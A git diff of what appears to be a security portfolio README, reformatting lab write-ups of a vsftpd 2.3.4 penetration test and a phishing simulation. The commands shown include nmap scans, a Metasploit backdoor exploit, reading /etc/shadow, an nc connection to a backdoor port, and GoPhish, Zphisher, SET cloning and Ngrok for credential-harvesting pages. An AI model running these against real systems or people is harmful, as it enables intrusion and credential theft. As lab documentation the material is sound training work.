@@ -17,32 +17,25 @@ Performed a full penetration test lifecycle: reconnaissance, scanning, vulnerabi
 - ✅ Brute force attacks with Hydra
 
 **Commands:**
-
-**Phase 1 — Reconnaissance**
 ```bash
-sudo netdiscover -r $HOST/24 -i eth0
-sudo nmap $HOST                          # basic scan
-sudo nmap -T5 -sV $HOST                  # version detection
-sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
-```
-
-**Phase 2 — Exploitation**
-```bash
-msfconsole
-msf6 > search vsftpd
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 > set RHOSTS $HOST
-msf6 > run
-```
-
-**Phase 3 — Post-Exploitation**
-```bash
-whoami
-hostname
-pwd
-ls /
-cat /etc/shadow
-nc $HOST 1524                            # secondary backdoor
+Phase 1 Reconnaissance
+# sudo netdiscover -r $HOST/24 -i eth0
+# sudo nmap $HOST                          # basic scan
+# sudo nmap -T5 -sV $HOST                  # version detection
+# sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
+Phase 2 Exploitation
+# msfconsole
+# msf6 > search vsftpd
+# msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+# msf6 > set RHOSTS $HOST
+# msf6 > run
+Phase 3 Post-Exploitation
+# whoami
+# hostname
+# pwd
+# ls /
+# cat /etc/shadow
+# nc $HOST 1524                            # secondary backdoor
 ```
                        
 **nmap version scan — identifying vsftpd 2.3.4**
@@ -73,17 +66,17 @@ Phase 1 — Infrastructure Setup
 - ✅ DNS persistence fix — /etc/resolv.conf locked with chattr +i to survive sudo sessions
 - ✅ SMTP delivery verified with swaks independently before GoPhish configuration
 
- **GoPhish setup**
 ```bash
-chmod +x gophish
-sudo ./gophish                           # launch admin panel at https://127.X.X.X:3XXX
+GoPhish setup
+# chmod +x gophish
+# sudo ./gophish                           # launch admin panel at https://12X.X.X.X:XXXX
 
-# DNS persistence fix — survives sudo and reboots
-echo "nameserver X.X.X.X" | sudo tee /etc/resolv.conf
-sudo chattr +i /etc/resolv.conf          # lock file from being overwritten
+DNS persistence fix — survives sudo and reboots
+# echo "nameserver X.X.X.X" | sudo tee /etc/resolv.conf
+# sudo chattr +i /etc/resolv.conf          # lock file from being overwritten
 
-# Verify DNS resolution
-ping smtp.xxxx.com -c 3
+Verify DNS resolution
+# ping smtp.xxxx.com -c 3
 ```
 
 Phase 2 — Credential Harvesting Pages
@@ -92,13 +85,14 @@ Phase 2 — Credential Harvesting Pages
 - ✅ Three tunnel services tested: Cloudflared (no account) · Ngrok · LocalXpose
 
 ```bash
-swaks --to $RECIPIENTEMAIL$ \
-      --from $SENDEREMAIL$ \
-      --server smtp.£HOSTEMAIL.com:$PORT \
-      --auth LOGIN \
-      --auth-user $SENDEREMAIL$ \
-      --auth-password [APP_PASSWORD] \
-      --tls
+Sending sample email with Swaks
+# swaks --to $RECIPIENTEMAIL$ \
+#       --from $SENDEREMAIL$ \
+#       --server smtp.£HOSTEMAIL.com:$PORT \
+#       --auth LOGIN \
+#       --auth-user $SENDEREMAIL$ \
+#       --auth-password [APP_PASSWORD] \
+#       --tls
 # Expected: 235 2.7.0 Accepted — authentication successful
 # Expected: 250 2.0.0 OK — email accepted for delivery
 ```
@@ -109,10 +103,11 @@ Phase 3 — Email Delivery
 - ✅ swaks verified SMTP authentication independently (235 2.7.0 Accepted)
 
 ```bash
-git clone https://github.com/htr-tech/zphisher.git
-cd zphisher
-chmod +x zphisher.sh
-bash zphisher.sh                       
+Launch Zphisher
+# git clone https://github.com/htr-tech/zphisher.git
+# cd zphisher
+# chmod +x zphisher.sh
+# bash zphisher.sh                       
 # Victim IP saved to:   auth/ip.txt
 ```
 
@@ -129,12 +124,10 @@ Phase 5 — GoPhish Campaign Results
 <br><img width="600" height="549" alt="image" src="https://github.com/user-attachments/assets/45dcf5f6-cdb7-4291-8dc1-beb906bac0ae" />
 ```bash
 sudo setoolkit
-
 # Post-back IP: 127.x.x.x
 # URL to clone: https://victimurl
-
-# Expose via Ngrok
-ngrok http $PROTOCOL
+Expose via Ngrok
+# ngrok http $PROTOCOL
 ```
 | Metric | Result | Notes |
 |---|---|---|
